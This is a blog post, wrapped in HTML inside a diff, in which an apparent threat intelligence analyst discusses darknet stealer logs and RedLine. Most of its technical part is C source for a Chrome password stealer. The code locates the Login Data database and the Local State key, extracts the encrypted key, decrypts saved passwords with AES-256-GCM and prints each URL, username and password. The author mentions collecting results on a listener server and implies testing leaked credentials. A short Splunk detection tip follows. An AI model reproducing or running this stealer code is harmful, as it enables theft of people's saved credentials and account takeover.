@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Hunting for Stealers :: Terminal</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="As a Threat Intelligence Analyst, part of my job involves scrolling through darknet forums and detecting potential attacks, breaches, and leaks (not the other one). One thing that always crosses my mind is how confidential data is freely posted on these forums. Most interesting one is of course stealer logs.
+A stealer is a Trojan that gathers information from a system. The most common form of stealers are those that gather logon information, like usernames and passwords, and then send the information to another system either via email or over a network.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://c0rt3x.xyz/posts/hunting-for-stealers/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/code.min.4f0ccc8439f99bf7f7970298556b94011aabc1fcae743b6842fc3361a2da9ea3.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/main.min.15870410d15d02abd22fb5ef00996f65a00d04b3a7435e9f83831c7c2298de88.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="https://c0rt3x.xyz/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="https://c0rt3x.xyz/favicon.png">
+<link rel="apple-touch-icon" href="https://c0rt3x.xyz/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Hunting for Stealers">
+<meta property="og:description" content="As a Threat Intelligence Analyst, part of my job involves scrolling through darknet forums and detecting potential attacks, breaches, and leaks (not the other one). One thing that always crosses my mind is how confidential data is freely posted on these forums. Most interesting one is of course stealer logs.
+A stealer is a Trojan that gathers information from a system. The most common form of stealers are those that gather logon information, like usernames and passwords, and then send the information to another system either via email or over a network.
+" />
+<meta property="og:url" content="https://c0rt3x.xyz/posts/hunting-for-stealers/" />
+<meta property="og:site_name" content="Terminal" />
+
+  <meta property="og:image" content="https://c0rt3x.xyz/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+  <meta property="article:section" content="blog" />
+
+
+  <meta property="article:published_time" content="2024-06-14 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/whoami">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+        
+          <li><a href="/posts">posts</a></li>
+        
+      
+        
+          <li><a href="/rants">rants</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+        
+          <li><a href="/posts" >posts</a></li>
+        
+      
+        
+          <li><a href="/rants" >rants</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://c0rt3x.xyz/posts/hunting-for-stealers/">Hunting for Stealers</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2024-06-14</time></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://c0rt3x.xyz/tags/threat-intelligence/">threat intelligence</a>&nbsp;
+      
+      #<a href="https://c0rt3x.xyz/tags/cybersecurity/">cybersecurity</a>&nbsp;
+      
+      #<a href="https://c0rt3x.xyz/tags/stealer/">stealer</a>&nbsp;
+      
+      #<a href="https://c0rt3x.xyz/tags/malware/">malware</a>&nbsp;
+      
+      #<a href="https://c0rt3x.xyz/tags/reverse-engineering/">reverse engineering</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>As a Threat Intelligence Analyst, part of my job involves scrolling through darknet forums and detecting potential attacks, breaches, and leaks (not the other one). One thing that always crosses my mind is how confidential data is freely posted on these forums. Most interesting one is of course stealer logs.</p>
+<blockquote>
+<p>A stealer is a Trojan that gathers information from a system. The most common form of stealers are those that gather logon information, like usernames and passwords, and then send the information to another system either via email or over a network.</p></blockquote>
+<h2 id="how-do-we-find-leaks">How do we find leaks?<a href="#how-do-we-find-leaks" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>It is easier than you think. You can literally get stealer logs just by visiting well-known forums, where they are displayed on the front page. However, some of the premium logs (what a fancy name) will require you to purchase them.</p>
+<p><img src="/images/stealer1.webp" alt="Alt text"></p>
+<p>If you dive deep into the darkness, you can find that you can even get them for free (almost).
+<img src="/images/stealer2.webp" alt="Alt text"></p>
+<p>There is no need to mention Telegram groups. It is the go-to place for leaks.</p>
+<p><img src="/images/stealer3.webp" alt="Alt text"></p>
+<h2 id="why-does-it-matter">Why does it matter?<a href="#why-does-it-matter" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>If you are familiar with Uber hack, hackers able to obtain access to the network via stolen credentials (probably stealer logs)</p>
+<blockquote>
+<p>“The Uber data breach began with a hacker purchasing stolen credentials belonging to an Uber employee from a dark web marketplace. An initial attempt to connect to Uber’s network with these credentials failed because the account was protected with MFA. To overcome this security obstacle, the hacker contacted the Uber employee via Whatsapp and, while pretending to be a member of Uber’s security, asked the employee to approve the MFA notifications being sent to their phone.”</p></blockquote>
+<p><img src="/images/stealer4.webp" alt="Alt text"></p>
+<p>Literally.</p>
+<p>Let’s open one of the log files and analyze it. As we can see, it contains credentials for Discord, eBay, Spotify, etc., that work (don’t ask me how I know).</p>
+<p><img src="/images/stealer5.webp" alt="Alt text"></p>
+<p>It is interesting, isn’t it? But how does it work? How can malware harvest our credentials that easily?</p>
+<blockquote>
+<p>RedLine Stealer is a malware available on underground forums for sale apparently as standalone ($100/$150 depending on the version) or also on a subscription basis ($100/month). This malware harvests information from browsers such as saved credentials, autocomplete data, and credit card information. A system inventory is also taken when running on a target machine, to include details such as the username, location data, hardware configuration, and information regarding installed security software. More recent versions of RedLine added the ability to steal cryptocurrency. FTP and IM clients are also apparently targeted by this family, and this malware has the ability to upload and download files, execute commands, and periodically send back information about the infected computer.</p></blockquote>
+<h2 id="how-chrome-saves-passwords">How Chrome saves passwords?<a href="#how-chrome-saves-passwords" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>The encrypted passwords are stored in a sqlite database located at:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">%</span><span class="n">APPDATA</span><span class="o">%</span><span class="p">..</span><span class="err">\</span><span class="n">Local</span><span class="err">\</span><span class="n">Google</span><span class="err">\</span><span class="n">Chrome</span><span class="err">\</span><span class="n">User</span> <span class="n">Data</span><span class="err">\</span><span class="n">Default</span><span class="err">\</span><span class="n">Login</span> <span class="n">Data</span>
+</span></span></code></pre></div><p>256 bit masterkey is stored in:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="n">AppData</span><span class="err">\</span><span class="n">Local</span><span class="err">\</span><span class="n">Google</span><span class="err">\</span><span class="n">Chrome</span><span class="err">\</span><span class="n">User</span> <span class="n">Data</span><span class="err">\</span><span class="n">Local</span> <span class="n">State</span>
+</span></span></code></pre></div><p>as a DPAPI secret again and each password item is then a hex encoded.</p>
+<blockquote>
+<p>Chrome encrypts this password using the Windows API function CryptProtectData. This function gets called in the user context of the machine and only a user with the same credentials as the user who encrypted the data can decrypt it. This encryption / decryption also must be carried out on the same machine (Microsoft, 2018).</p></blockquote>
+<h2 id="writing-stealer-to-dump-passwords">Writing stealer to dump passwords<a href="#writing-stealer-to-dump-passwords" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>We will write our stealer in C (because why not). First, we need to state where passwords and encryption keys are stored. You can get full code from my github repo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">snprintf</span><span class="p">(</span><span class="n">password_path</span><span class="p">,</span> <span class="n">MAX_PATH_LENGTH</span><span class="p">,</span> <span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">%s</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">Local</span><span class="se">\\</span><span class="s">Google</span><span class="se">\\</span><span class="s">Chrome</span><span class="se">\\</span><span class="s">User Data</span><span class="se">\\</span><span class="s">Default</span><span class="se">\\</span><span class="s">Login Data&#34;</span><span class="p">,</span> <span class="n">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">encryption_key_path</span><span class="p">[</span><span class="n">MAX_PATH_LENGTH</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nf">snprintf</span><span class="p">(</span><span class="n">encryption_key_path</span><span class="p">,</span> <span class="n">MAX_PATH_LENGTH</span><span class="p">,</span> <span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">%s</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">Local</span><span class="se">\\</span><span class="s">Google</span><span class="se">\\</span><span class="s">Chrome</span><span class="se">\\</span><span class="s">User Data</span><span class="se">\\</span><span class="s">Local State&#34;</span><span class="p">,</span> <span class="n">username</span><span class="p">);</span>
+</span></span></code></pre></div><p>In order to get encryption key we use getEncryptionKey function. This function reads an encryption key from a file specified by encryption_key_path by locating the string &ldquo;encrypted_key&rdquo; within the file and returns the key as a dynamically allocated string. If the file cannot be opened or memory allocation fails, it returns NULL.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span><span class="o">*</span> <span class="nf">getEncryptionKey</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">encryption_key_path</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span><span class="o">*</span> <span class="n">encryption_key_file</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="n">encryption_key_path</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">encryption_key_file</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Error opening encryption_key_file: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">displayErrorMessage</span><span class="p">(</span><span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">MAX_LINE_LENGTH</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">key</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="nf">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">MAX_LINE_LENGTH</span><span class="p">,</span> <span class="n">encryption_key_file</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span><span class="o">*</span> <span class="n">key_start</span> <span class="o">=</span> <span class="nf">strstr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\&#34;</span><span class="s">encrypted_key</span><span class="se">\&#34;</span><span class="s">:</span><span class="se">\&#34;</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">key_start</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">offset</span> <span class="o">+=</span> <span class="n">key_start</span> <span class="o">-</span> <span class="n">buffer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">fseek</span><span class="p">(</span><span class="n">encryption_key_file</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">MAX_LINE_LENGTH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">key</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Error: Memory allocation failed.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">fclose</span><span class="p">(</span><span class="n">encryption_key_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">fgets</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">MAX_LINE_LENGTH</span><span class="p">,</span> <span class="n">encryption_key_file</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Error reading key value.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">fclose</span><span class="p">(</span><span class="n">encryption_key_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">free</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">offset</span> <span class="o">+=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">encryption_key_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>This function decrypts a given ciphertext using AES-256-GCM, storing the decrypted data in the decrypted buffer, and prints an error message if decryption fails.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">decrypt_payload</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">ciphertext</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">ciphertext_len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">iv</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">decrypted</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">decrypted_len</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="nf">crypto_aead_aes256gcm_decrypt</span><span class="p">(</span><span class="n">decrypted</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">decrypted_len</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">,</span> <span class="n">ciphertext_len</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Decryption failed</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">displayErrorMessage</span><span class="p">(</span><span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>This code snippet connects to an SQLite database, retrieves login information, and attempts to decrypt the stored passwords using AES-256-GCM. If any step fails, it prints an error message and continues to the next entry.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">sqlite3</span><span class="o">*</span> <span class="n">db</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">rc</span> <span class="o">=</span> <span class="nf">sqlite3_open</span><span class="p">(</span><span class="n">password_path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">db</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">rc</span> <span class="o">!=</span> <span class="n">SQLITE_OK</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Cannot open database: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">sqlite3_errmsg</span><span class="p">(</span><span class="n">db</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">sqlite3_close</span><span class="p">(</span><span class="n">db</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">sql</span> <span class="o">=</span> <span class="s">&#34;SELECT origin_url, username_value, password_value FROM logins&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">sqlite3_stmt</span><span class="o">*</span> <span class="n">stmt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">rc</span> <span class="o">=</span> <span class="nf">sqlite3_prepare_v2</span><span class="p">(</span><span class="n">db</span><span class="p">,</span> <span class="n">sql</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stmt</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">rc</span> <span class="o">!=</span> <span class="n">SQLITE_OK</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Failed to execute SQL query: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">sqlite3_errmsg</span><span class="p">(</span><span class="n">db</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">sqlite3_close</span><span class="p">(</span><span class="n">db</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="nf">sqlite3_step</span><span class="p">(</span><span class="n">stmt</span><span class="p">)</span> <span class="o">==</span> <span class="n">SQLITE_ROW</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">originUrl</span> <span class="o">=</span> <span class="nf">sqlite3_column_text</span><span class="p">(</span><span class="n">stmt</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">usernameValue</span> <span class="o">=</span> <span class="nf">sqlite3_column_text</span><span class="p">(</span><span class="n">stmt</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">void</span><span class="o">*</span> <span class="n">passwordBlob</span> <span class="o">=</span> <span class="nf">sqlite3_column_blob</span><span class="p">(</span><span class="n">stmt</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">passwordSize</span> <span class="o">=</span> <span class="nf">sqlite3_column_bytes</span><span class="p">(</span><span class="n">stmt</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Origin URL: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">originUrl</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Username: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">usernameValue</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">iv</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">passwordSize</span> <span class="o">&gt;=</span> <span class="mi">15</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">memcpy</span><span class="p">(</span><span class="n">iv</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">passwordBlob</span> <span class="o">+</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Password size too small to generate IV</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">passwordSize</span> <span class="o">&lt;=</span> <span class="mi">15</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Password size too small</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">BYTE</span><span class="o">*</span> <span class="n">Password</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">passwordSize</span> <span class="o">-</span> <span class="mi">14</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">Password</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">passwordBlob</span> <span class="o">+</span> <span class="mi">15</span><span class="p">,</span> <span class="n">passwordSize</span> <span class="o">-</span> <span class="mi">15</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Password</span><span class="p">[</span><span class="n">passwordSize</span> <span class="o">-</span> <span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">decrypt_payload</span><span class="p">(</span><span class="n">Password</span><span class="p">,</span> <span class="n">passwordSize</span> <span class="o">-</span> <span class="mi">15</span><span class="p">,</span> <span class="n">masterkey</span><span class="p">.</span><span class="n">pbData</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">Password</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Decrypted password is: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">Password</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>After running the payload, we can see the credentials on our listener server, indicating that the operation was successful.
+How we detect?</p>
+<p>If we analyze collected logs in Splunk by writing a correlation search with event code 4663, which indicates an attempt was made to access an object related to login data, we can identify access attempts where the action is ReadData. To reduce false positives, we can further exclude Chrome from the process path.</p>
+<p>Last Note</p>
+<p>Pls don’t use crack programs (they are trojans with stealers in them. Nothing is free in this world.) 🙏🙏🙏</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="https://c0rt3x.xyz/posts/syscalls-edr-evasion/" class="button inline prev">
+        &lt; [<span class="button__text">Syscalls — EDR evasion p1 (optional)</span>]
+      </a>
+    
+    
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
